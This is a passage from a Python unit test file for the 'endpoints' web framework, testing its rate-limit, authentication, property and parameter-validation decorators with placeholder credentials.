        controllers = r.controllers
        self.assertEqual(s, controllers)

        # just making sure it always returns the same list
        controllers = r.controllers
        self.assertEqual(s, controllers)


class DecoratorsRatelimitTest(TestCase):
    def test_throttle(self):

        class TARA(object):
            @endpoints.decorators.ratelimit(limit=3, ttl=1)
            def foo(self): return 1

            @endpoints.decorators.ratelimit(limit=10, ttl=1)
            def bar(self): return 2


        r_foo = endpoints.Request()
        r_foo.set_header("X_FORWARDED_FOR", "276.0.0.1")
        r_foo.path = "/foo"
        c = TARA()
        c.request = r_foo

        for x in range(3):
            r = c.foo()
            self.assertEqual(1, r)

        for x in range(2):
            with self.assertRaises(endpoints.CallError):
                c.foo()

        # make sure another path isn't messed with by foo
        r_bar = endpoints.Request()
        r_bar.set_header("X_FORWARDED_FOR", "276.0.0.1")
        r_bar.path = "/bar"
        c.request = r_bar
        for x in range(10):
            r = c.bar()
            self.assertEqual(2, r)
            time.sleep(0.1)

        with self.assertRaises(endpoints.CallError):
            c.bar()

        c.request = r_foo

        for x in range(3):
            r = c.foo()
            self.assertEqual(1, r)

        for x in range(2):
            with self.assertRaises(endpoints.CallError):
                c.foo()


class DecoratorsAuthTest(TestCase):
    def get_basic_auth_header(self, username, password):
        credentials = base64.b64encode('{}:{}'.format(username, password)).strip()
        return 'Basic {}'.format(credentials)

    def get_bearer_auth_header(self, access_token):
        return 'Bearer {}'.format(access_token)


    def test_bad_setup(self):

        def target(request, *args, **kwargs):
            pass

        class TARA(object):
            @endpoints.decorators.auth.token_auth(target=target)
            def foo_token(self): pass

            @endpoints.decorators.auth.client_auth(target=target)
            def foo_client(self): pass

            @endpoints.decorators.auth.basic_auth(target=target)
            def foo_basic(self): pass

            @endpoints.decorators.auth.auth("Basic", target=target)
            def foo_auth(self): pass

        r = endpoints.Request()
        c = TARA()
        c.request = r

        for m in ["foo_token", "foo_client", "foo_basic", "foo_auth"]: 
            with self.assertRaises(endpoints.AccessDenied):
                getattr(c, m)()

    def test_token_auth(self):
        def target(request, access_token):
            if access_token != "bar":
                raise ValueError()
            return True

        def target_bad(request, *args, **kwargs):
            pass

        class TARA(object):
            @endpoints.decorators.auth.token_auth(target=target)
            def foo(self): pass

            @endpoints.decorators.auth.token_auth(target=target_bad)
            def foo_bad(self): pass

        r = endpoints.Request()
        c = TARA()
        c.request = r

        r.set_header('authorization', self.get_bearer_auth_header("foo"))
        with self.assertRaises(endpoints.AccessDenied):
            c.foo()

        r.set_header('authorization', self.get_bearer_auth_header("bar"))
        c.foo()

        r = endpoints.Request()
        c.request = r

        r.body_kwargs["access_token"] = "foo"
        with self.assertRaises(endpoints.AccessDenied):
            c.foo()

        r.body_kwargs["access_token"] = "bar"
        c.foo()

        r = endpoints.Request()
        c.request = r

        r.query_kwargs["access_token"] = "foo"
        with self.assertRaises(endpoints.AccessDenied):
            c.foo()

        r.query_kwargs["access_token"] = "bar"
        c.foo()

        with self.assertRaises(endpoints.AccessDenied):
            c.foo_bad()

    def test_client_auth(self):
        def target(request, client_id, client_secret):
            return client_id == "foo" and client_secret == "bar"

        def target_bad(request, *args, **kwargs):
            pass

        class TARA(object):
            @endpoints.decorators.auth.client_auth(target=target)
            def foo(self): pass

            @endpoints.decorators.auth.client_auth(target=target_bad)
            def foo_bad(self): pass

        client_id = "foo"
        client_secret = "..."
        r = endpoints.Request()
        r.set_header('authorization', self.get_basic_auth_header(client_id, client_secret))

        c = TARA()
        c.request = r
        with self.assertRaises(endpoints.AccessDenied):
            c.foo()

        client_secret = "bar"
        r.set_header('authorization', self.get_basic_auth_header(client_id, client_secret))
        c.foo()

        with self.assertRaises(endpoints.AccessDenied):
            c.foo_bad()

    def test_basic_auth(self):
        def target(request, username, password):
            if username != "bar":
                raise ValueError()
            return True

        def target_bad(request, *args, **kwargs):
            pass

        class TARA(object):
            @endpoints.decorators.auth.basic_auth(target=target)
            def foo(self): pass

            @endpoints.decorators.auth.basic_auth(target=target_bad)
            def foo_bad(self): pass

        username = "foo"
        password = "..."
        r = endpoints.Request()
        r.set_header('authorization', self.get_basic_auth_header(username, password))

        c = TARA()
        c.request = r
        with self.assertRaises(endpoints.AccessDenied):
            c.foo()

        username = "bar"
        r.set_header('authorization', self.get_basic_auth_header(username, password))
        c.foo()

        with self.assertRaises(endpoints.AccessDenied):
            c.foo_bad()

    def test_basic_auth_same_kwargs(self):
        def target(request, username, password):
            if username != "bar":
                raise ValueError()
            return True

        class MockObject(object):
            @endpoints.decorators.auth.basic_auth(target=target)
            def foo(self, *args, **kwargs): return 1

        c = MockObject()
        username = "bar"
        password = "..."
        r = endpoints.Request()
        r.set_header('authorization', self.get_basic_auth_header(username, password))
        c.request = r

        # if no TypeError is raised then it worked :)
        r = c.foo(request="this_should_error_out")
        self.assertEqual(1, r)

    def test_auth(self):
        def target(request, controller_args, controller_kwargs):
            if request.body_kwargs["foo"] != "bar":
                raise ValueError()
            return True

        def target_bad(request, *args, **kwargs):
            pass

        class TARA(object):
            @endpoints.decorators.auth.auth("Basic", target=target)
            def foo(self): pass

            @endpoints.decorators.auth.auth(target=target_bad)
            def foo_bad(self): pass

        r = endpoints.Request()
        r.body_kwargs = {"foo": "che"}

        c = TARA()
        c.request = r
        with self.assertRaises(endpoints.AccessDenied):
            c.foo()

        r.body_kwargs = {"foo": "bar"}
        c.foo()


class DecoratorsTest(TestCase):
    def test__property_init(self):
        counts = dict(fget=0, fset=0, fdel=0)
        def fget(self):
            counts["fget"] += 1
            return self._v

        def fset(self, v):
            counts["fset"] += 1
            self._v = v

        def fdel(self):
            counts["fdel"] += 1
            del self._v

        class FooPropInit(object):
            v = endpoints.decorators._property(fget, fset, fdel, "this is v")
        f = FooPropInit()
        f.v = 6
        self.assertEqual(6, f.v)
        self.assertEqual(2, sum(counts.values()))
        del f.v
        self.assertEqual(3, sum(counts.values()))

        counts = dict(fget=0, fset=0, fdel=0)
        class FooPropInit2(object):
            v = endpoints.decorators._property(fget=fget, fset=fset, fdel=fdel, doc="this is v")
        f = FooPropInit2()
        f.v = 6
        self.assertEqual(6, f.v)
        self.assertEqual(2, sum(counts.values()))
        del f.v
        self.assertEqual(3, sum(counts.values()))

    def test__property_allow_empty(self):
        class PAE(object):
            foo_val = None
            @endpoints.decorators._property(allow_empty=False)
            def foo(self):
                return self.foo_val

        c = PAE()
        self.assertEqual(None, c.foo)
        self.assertFalse('_foo' in c.__dict__)

        c.foo_val = 1
        self.assertEqual(1, c.foo)
        self.assertTrue('_foo' in c.__dict__)

    def test__property_setter(self):
        class WPS(object):
            foo_get = False
            foo_set = False
            foo_del = False

            @endpoints.decorators._property
            def foo(self):
                self.foo_get = True
                return 1

            @foo.setter
            def foo(self, val):
                self.foo_set = True
                self._foo = val

            @foo.deleter
            def foo(self):
                self.foo_del = True
                del(self._foo)

        c = WPS()

        self.assertEqual(1, c.foo)

        c.foo = 5
        self.assertEqual(5, c.foo)

        del(c.foo)
        self.assertEqual(1, c.foo)

        self.assertTrue(c.foo_get)
        self.assertTrue(c.foo_set)
        self.assertTrue(c.foo_del)

    def test__property__strange_behavior(self):
        class BaseFoo(object):
            def __init__(self):
                setattr(self, 'bar', None)

            def __setattr__(self, n, v):
                super(BaseFoo, self).__setattr__(n, v)

        class Foo(BaseFoo):
            @endpoints.decorators._property(allow_empty=False)
            def bar(self):
                return 1

        f = Foo()
        self.assertEqual(1, f.bar)

        f.bar = 2
        self.assertEqual(2, f.bar)

    def test__property___dict__direct(self):
        """
        this is a no win situation

        if you have a bar _property and a __setattr__ that modifies directly then
        the other _property values like __set__ will not get called, and you can't
        have _property.__get__ look for the original name because there are times
        when you want your _property to override a parent's original value for the
        property, so I've chosen to just ignore this case and not support it
        """
        class Foo(object):
            @endpoints.decorators._property
            def bar(self):
                return 1
            def __setattr__(self, field_name, field_val):
                self.__dict__[field_name] = field_val
                #super(Foo, self).__setattr__(field_name, field_val)

        f = Foo()
        f.bar = 2 # this will be ignored
        self.assertEqual(1, f.bar)

    def test__property(self):
        class WP(object):
            count_foo = 0

            @endpoints.decorators._property(True)
            def foo(self):
                self.count_foo += 1
                return 1

            @endpoints.decorators._property(read_only=True)
            def baz(self):
                return 2

            @endpoints.decorators._property()
            def bar(self):
                return 3

            @endpoints.decorators._property
            def che(self):
                return 4

        c = WP()
        r = c.foo
        self.assertEqual(1, r)
        self.assertEqual(1, c._foo)
        with self.assertRaises(AttributeError):
            c.foo = 2
        with self.assertRaises(AttributeError):
            del(c.foo)
        c.foo
        c.foo
        self.assertEqual(1, c.count_foo)

        r = c.baz
        self.assertEqual(2, r)
        self.assertEqual(2, c._baz)
        with self.assertRaises(AttributeError):
            c.baz = 3
        with self.assertRaises(AttributeError):
            del(c.baz)

        r = c.bar
        self.assertEqual(3, r)
        self.assertEqual(3, c._bar)
        c.bar = 4
        self.assertEqual(4, c.bar)
        self.assertEqual(4, c._bar)
        del(c.bar)
        r = c.bar
        self.assertEqual(3, r)

        r = c.che
        self.assertEqual(4, r)
        self.assertEqual(4, c._che)
        c.che = 4
        self.assertEqual(4, c.che)
        del(c.che)
        r = c.che
        self.assertEqual(4, r)

    def test_require_params(self):
        class MockObject(object):
            request = endpoints.Request()

            @endpoints.decorators.require_params('foo', 'bar')
            def foo(self, *args, **kwargs): return 1

            @endpoints.decorators.require_params('foo', 'bar', allow_empty=True)
            def bar(self, *args, **kwargs): return 2

        o = MockObject()
        o.request.method = 'GET'
        o.request.query_kwargs = {'foo': 1}

        with self.assertRaises(endpoints.CallError):
            o.foo()

        with self.assertRaises(endpoints.CallError):
            o.bar()

        o.request.query_kwargs['bar'] = 2
        r = o.foo(**o.request.query_kwargs)
        self.assertEqual(1, r)

        r = o.bar(**o.request.query_kwargs)
        self.assertEqual(2, r)

        o.request.query_kwargs['bar'] = 0
        with self.assertRaises(endpoints.CallError):
            o.foo(**o.request.query_kwargs)

        r = o.bar(**o.request.query_kwargs)
        self.assertEqual(2, r)

    def test_param_dest(self):
        """make sure the dest=... argument works"""
        # https://docs.python.org/2/library/argparse.html#dest
        c = create_controller()

        @endpoints.decorators.param('foo', dest='bar')
        def foo(self, *args, **kwargs):
            return kwargs.get('bar')

        r = foo(c, **{'foo': 1})
        self.assertEqual(1, r)

    def test_param_multiple_names(self):
        c = create_controller()

        @endpoints.decorators.param('foo', 'foos', 'foo3', type=int)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        r = foo(c, **{'foo': 1})
        self.assertEqual(1, r)

        r = foo(c, **{'foos': 2})
        self.assertEqual(2, r)

        r = foo(c, **{'foo3': 3})
        self.assertEqual(3, r)

        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo4': 0})

    def test_param_callable_default(self):
        c = create_controller()

        @endpoints.decorators.param('foo', default=time.time)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        start = time.time()
        r1 = foo(c, **{})
        self.assertLess(start, r1)

        time.sleep(0.25)
        r2 = foo(c, **{})
        self.assertLess(r1, r2)


    def test_param_not_required(self):
        c = create_controller()

        @endpoints.decorators.param('foo', required=False)
        def foo(self, *args, **kwargs):
            return 'foo' in kwargs

        r = foo(c, **{'foo': 1})
        self.assertTrue(r)

        r = foo(c, **{})
        self.assertFalse(r)

        @endpoints.decorators.param('foo', required=False, default=5)
        def foo(self, *args, **kwargs):
            return 'foo' in kwargs

        r = foo(c, **{})
        self.assertTrue(r)

        @endpoints.decorators.param('foo', type=int, required=False)
        def foo(self, *args, **kwargs):
            return 'foo' in kwargs

        r = foo(c, **{})
        self.assertFalse(r)


    def test_param_unicode(self):
        c = create_controller()
        r = endpoints.Request()
        r.set_header("content-type", "application/json;charset=UTF-8")
        charset = r.charset
        c.request = r
        #self.assertEqual("UTF-8", charset)

        @endpoints.decorators.param('foo', type=str)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        words = testdata.get_unicode_words()
        ret = foo(c, **{"foo": words})
        self.assertEqual(ret, words.encode("UTF-8"))

    #def test_param_append_list(self):
        # TODO -- make this work


    def test_param(self):
        c = create_controller()

        @endpoints.decorators.param('foo', type=int)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': 0})

        @endpoints.decorators.param('foo', default=0)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        r = foo(c, **{})
        self.assertEqual(0, r)

        @endpoints.decorators.param('foo', type=int, choices=set([1, 2, 3]))
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        c.request.method = 'POST'
        c.request.body_kwargs = {'foo': '1'}
        r = foo(c, **c.request.body_kwargs)
        self.assertEqual(1, r)

        c.request.body_kwargs = {}
        r = foo(c, **{'foo': '2'})
        self.assertEqual(2, r)

    def test_post_param(self):
        c = create_controller()
        c.request.method = 'POST'

        @endpoints.decorators.post_param('foo', type=int, choices=set([1, 2, 3]))
        def foo(self, *args, **kwargs):
            return kwargs['foo']

        with self.assertRaises(endpoints.CallError):
            r = foo(c)

        c.request.query_kwargs['foo'] = '1'
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': '1'})

        c.request.body_kwargs = {'foo': '8'}
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **c.request.body_kwargs)

        c.request.query_kwargs = {}
        c.request.body_kwargs = {'foo': '1'}
        r = foo(c, **c.request.body_kwargs)
        self.assertEqual(1, r)

        c.request.query_kwargs = {'foo': '1'}
        c.request.body_kwargs = {'foo': '3'}
        r = foo(c, **{'foo': '3'})
        self.assertEqual(3, r)

    def test_get_param(self):
        c = create_controller()

        c.request.query_kwargs = {'foo': '8'}
        @endpoints.decorators.get_param('foo', type=int, choices=set([1, 2, 3]))
        def foo(*args, **kwargs):
            return kwargs['foo']
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **c.request.query_kwargs)

        c.request.query_kwargs = {'foo': '1'}
        @endpoints.decorators.get_param('foo', type=int, choices=set([1, 2, 3]))
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c, **c.request.query_kwargs)
        self.assertEqual(1, r)

        c.request.query_kwargs = {'foo': '1', 'bar': '1.5'}
        @endpoints.decorators.get_param('foo', type=int)
        @endpoints.decorators.get_param('bar', type=float)
        def foo(*args, **kwargs):
            return kwargs['foo'], kwargs['bar']
        r = foo(c, **c.request.query_kwargs)
        self.assertEqual(1, r[0])
        self.assertEqual(1.5, r[1])

        c.request.query_kwargs = {'foo': '1'}
        @endpoints.decorators.get_param('foo', type=int, action='blah')
        def foo(*args, **kwargs):
            return kwargs['foo']
        with self.assertRaises(ValueError):
            r = foo(c, **c.request.query_kwargs)

        c.request.query_kwargs = {'foo': ['1,2,3,4', '5']}
        @endpoints.decorators.get_param('foo', type=int, action='store_list')
        def foo(*args, **kwargs):
            return kwargs['foo']
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **c.request.query_kwargs)

        c.request.query_kwargs = {'foo': ['1,2,3,4', '5']}
        @endpoints.decorators.get_param('foo', type=int, action='append_list')
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c, **c.request.query_kwargs)
        self.assertEqual(range(1, 6), r)

        c.request.query_kwargs = {'foo': '1,2,3,4'}
        @endpoints.decorators.get_param('foo', type=int, action='store_list')
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c, **c.request.query_kwargs)
        self.assertEqual(range(1, 5), r)

        c.request.query_kwargs = {}

        @endpoints.decorators.get_param('foo', type=int, default=1, required=False)
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c)
        self.assertEqual(1, r)

        @endpoints.decorators.get_param('foo', type=int, default=1, required=True)
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c)
        self.assertEqual(1, r)

        @endpoints.decorators.get_param('foo', type=int, default=1)
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c)
        self.assertEqual(1, r)

        @endpoints.decorators.get_param('foo', type=int)
        def foo(*args, **kwargs):
            return kwargs['foo']
        with self.assertRaises(endpoints.CallError):
            r = foo(c)

        c.request.query_kwargs = {'foo': '1'}
        @endpoints.decorators.get_param('foo', type=int)
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c, **c.request.query_kwargs)
        self.assertEqual(1, r)

    def test_param_size(self):
        c = create_controller()

        @endpoints.decorators.param('foo', type=int, min_size=100)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': 0})
        r = foo(c, **{'foo': 200})
        self.assertEqual(200, r)

        @endpoints.decorators.param('foo', type=int, max_size=100)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': 200})
        r = foo(c, **{'foo': 20})
        self.assertEqual(20, r)

        @endpoints.decorators.param('foo', type=int, min_size=100, max_size=200)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        r = foo(c, **{'foo': 120})
        self.assertEqual(120, r)

        @endpoints.decorators.param('foo', type=str, min_size=2, max_size=4)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        r = foo(c, **{'foo': 'bar'})
        self.assertEqual('bar', r)
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': 'barbar'})

    def test_param_lambda_type(self):
        c = create_controller()

        @endpoints.decorators.param('foo', type=lambda x: x.upper())
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        r = foo(c, **{'foo': 'bar'})
        self.assertEqual('BAR', r)

    def test_param_empty_default(self):
        c = create_controller()

        @endpoints.decorators.param('foo', default=None)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        r = foo(c, **{})
        self.assertEqual(None, r)

    def test_param_reference_default(self):
        c = create_controller()

        @endpoints.decorators.param('foo', default={})
        def foo(self, *args, **kwargs):
            kwargs['foo'][testdata.get_ascii()] = testdata.get_ascii()
            return kwargs['foo']

        r = foo(c, **{})
        self.assertEqual(1, len(r))

        r = foo(c, **{})
        self.assertEqual(1, len(r))

        @endpoints.decorators.param('foo', default=[])
        def foo(self, *args, **kwargs):
            kwargs['foo'].append(testdata.get_ascii())
            return kwargs['foo']

        r = foo(c, **{})
        self.assertEqual(1, len(r))

        r = foo(c, **{})
        self.assertEqual(1, len(r))

    def test_param_regex(self):
        c = create_controller()

        @endpoints.decorators.param('foo', regex="^\S+@\S+$")
        def foo(self, *args, **kwargs):
            return kwargs['foo']

        r = foo(c, **{'foo': 'foo@bar.com'})

        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': ' foo@bar.com'})

        @endpoints.decorators.param('foo', regex=re.compile("^\S+@\S+$", re.I))
        def foo(self, *args, **kwargs):
            return kwargs['foo']

        r = foo(c, **{'foo': 'foo@bar.com'})

        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': ' foo@bar.com'})

    def test_param_bool(self):
        c = create_controller()

        @endpoints.decorators.param('foo', type=bool, allow_empty=True)
        def foo(self, *args, **kwargs):
            return kwargs['foo']

        r = foo(c, **{'foo': 'true'})
        self.assertEqual(True, r)

        r = foo(c, **{'foo': 'True'})
        self.assertEqual(True, r)

        r = foo(c, **{'foo': '1'})
        self.assertEqual(True, r)

        r = foo(c, **{'foo': 'false'})
        self.assertEqual(False, r)

        r = foo(c, **{'foo': 'False'})
        self.assertEqual(False, r)

        r = foo(c, **{'foo': '0'})
        self.assertEqual(False, r)

        @endpoints.decorators.param('bar', type=bool, require=True)
        def bar(self, *args, **kwargs):
            return kwargs['bar']

        r = bar(c, **{'bar': 'False'})
        self.assertEqual(False, r)

    def test_param_list(self):
        c = create_controller()

        @endpoints.decorators.param('foo', type=list)
        def foo(self, *args, **kwargs):
            return kwargs['foo']

        r = foo(c, **{'foo': ['bar', 'baz']})
        self.assertEqual(r, ['bar', 'baz'])

    def test_param_arg(self):
        c = create_controller()

        @endpoints.decorators.param('foo')
        @endpoints.decorators.param('bar')
        @endpoints.decorators.param('che')
        @endpoints.decorators.param('baz')
        def foo(self, *args, **kwargs):
            return 100

        r = foo(c, **{'foo': 1, 'bar': 2, 'che': 3, 'baz': 4})
        self.assertEqual(100, r)


